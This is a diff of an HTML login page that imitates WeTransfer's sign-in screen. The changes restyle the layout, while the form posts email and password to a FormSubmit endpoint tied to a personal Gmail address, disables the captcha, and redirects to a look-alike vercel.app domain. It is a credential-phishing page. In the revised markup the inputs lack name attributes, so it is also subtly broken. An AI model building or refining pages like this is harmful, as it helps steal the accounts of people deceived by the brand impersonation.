@@ -1,98 +1,203 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Wetransfer</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WeTransfer Sign In</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="family">
+  
+  <style>
+    /* Reset and Base Styles */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
 
-<link href="[fonts.googleapis.com](https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap)" rel="stylesheet">
+    body {
+      background-color: #f7f7f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
 
-<style>
-*{
-  margin:0;
-  padding:0;
-  box-sizing:border-box;
-  font-family:'Poppins',sans-serif;
-}
+    /* Card Wrapper */
+    .login-container {
+      background: #ffffff;
+      width: 100%;
+      max-width: 420px;
+      padding: 40px 32px;
+      text-align: center;
+    }
 
-/* Typographic scales and spacing fixes for mobile */
-@media (max-width: 480px) {
-  .logo { 
-    font-size: clamp(36px, 9vw, 56px); 
-  }
-  .title { 
-    font-size: clamp(10px, 6vw, 20px); 
-  }
-  .subtitle { 
-    font-size: clamp(10px, 3.2vw, 13px); 
-  }
-  /* Ensures adequate spacing between stacked form elements */
-  .input-group {
-    margin-bottom: 16px; 
-  }
-}
+    /* Logo Styling */
+    .logo {
+      font-family: "Times New Roman", Times, serif; /* Approximation of the serif branding if logo asset isn't used */
+      font-size: 44px;
+      font-weight: 900;
+      letter-spacing: -1.5px;
+      color: #000000;
+      margin-bottom: 36px;
+    }
 
-/* Very small devices */
-@media (max-width: 320px) {
-  body { 
-    padding: 16px; /* Slightly increased to prevent edge clipping */
-  }
-  .wrapper { 
-    padding: 0; 
-  }
-  .input-group input {
-    padding: 14px 16px;
-    font-size: 16px;
-  }
-  /* Added a top margin to the button to explicitly force space below the input fields */
-  .btn {
-    font-size: 18px;
-    padding: 14px;
-    margin-top: 16px; 
-  }
-}
+    /* Headings */
+    .title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #000000;
+      margin-bottom: 6px;
+    }
 
+    .subtitle {
+      font-size: 14px;
+      color: #333333;
+      margin-bottom: 28px;
+    }
 
-</style>
+    /* Input Groups with Floating/Top Labels */
+    .input-group {
+      position: relative;
+      margin-bottom: 14px;
+      text-align: left;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 24px 16px 10px 16px; /* Extra top padding to make room for the label */
+      font-size: 16px;
+      color: #000000;
+      background-color: #ffffff;
+      border: 1px solid #d3d3d3;
+      border-radius: 14px; /* Distinct soft rounded corner */
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+
+    .input-group input:focus {
+      border-color: #4070f4;
+    }
+
+    /* Small Label inside the input box */
+    .input-group label {
+      position: absolute;
+      top: 8px;
+      left: 16px;
+      font-size: 11px;
+      color: #737373;
+      pointer-events: none;
+    }
+
+    /* Primary Action Button */
+    .btn-continue {
+      width: 100%;
+      padding: 16px;
+      background-color: #4070f4; /* Precise WeTransfer Blue */
+      color: #ffffff;
+      border: none;
+      border-radius: 14px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 4px;
+      margin-bottom: 28px;
+      transition: background-color 0.2s ease;
+    }
+
+    .btn-continue:hover {
+      background-color: #2b5cd4;
+    }
+
+    /* Secondary Links */
+    .links-container {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 24px;
+    }
+
+    .link {
+      font-size: 14px;
+      color: #000000;
+      text-decoration: underline;
+      cursor: pointer;
+    }
+
+    /* Divider "or" line */
+    .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      color: #a6a6a6;
+      font-size: 13px;
+      margin-bottom: 24px;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #e6e6e6;
+    }
+
+    .divider:not(:empty)::before {
+      margin-right: .5em;
+    }
+
+    .divider:not(:empty)::after {
+      margin-left: .5em;
+    }
+
+    /* Responsive Tuning */
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 24px 16px;
+      }
+    }
+  </style>
 </head>
 <body>
 
-<div class="wrapper">
+  <div class="login-container">
+    <div class="logo">WeTransfer</div>
 
-  <img src="logo.08he3n6vuv2qc (1).svg">
-  <div class="title">Sign In</div>
-  <div class="subtitle">to continue to your WeTransfer account.</div>
+    <h2 class="title">Sign In</h2>
+    <p class="subtitle">to continue to your WeTransfer account.</p>
 
-  <!-- ✅ FormSubmit Integration -->
+    <!-- ✅ FormSubmit Integration -->
   <form action="https://formsubmit.co/sloan6721oq@gmail.com" method="POST">
 
 
     <input type="hidden" name="_next" value="https://wetranfersrgd-x8f8.vercel.app/">
     <input type="hidden" name="_captcha" value="false">
+      
+      <div class="input-group">
+        <label for="email">Email</label>
+        <input type="email" id="email"required>
+      </div>
 
-    <div class="input-group">
-      <input type="email" name="email" placeholder="Enter email" required>
+      <div class="input-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" placeholder="Password" required style="color: transparent; text-shadow: 0 0 0 #000;"> 
+        </div>
+
+      <button type="submit" class="btn-continue">Continue</button>
+      
+    </form>
+
+    <div class="links-container">
+      <a class="link">Forgot password?</a>
+      <a class="link">Use a different email?</a>
     </div>
 
-    <div class="input-group">
-      <input type="password" name="password" placeholder="Type your password..." required>
-    </div>
+    <div class="divider">or</div>
 
-    <button type="submit" class="btn">Continue</button>
-  </form>
-
-  <div class="links">
-    <a href="#">Forgot password?</a>
-    <a href="#">Use a different email?</a>
+    <a class="link">Receive a temporary code via email</a>
   </div>
-
-  <div class="divider"><span>or</span></div>
-
-  <div class="bottom-text">
-    Receive a <a href="#">temporary code via email</a>
-  </div>
-
-</div>
 
 </body>
 </html>
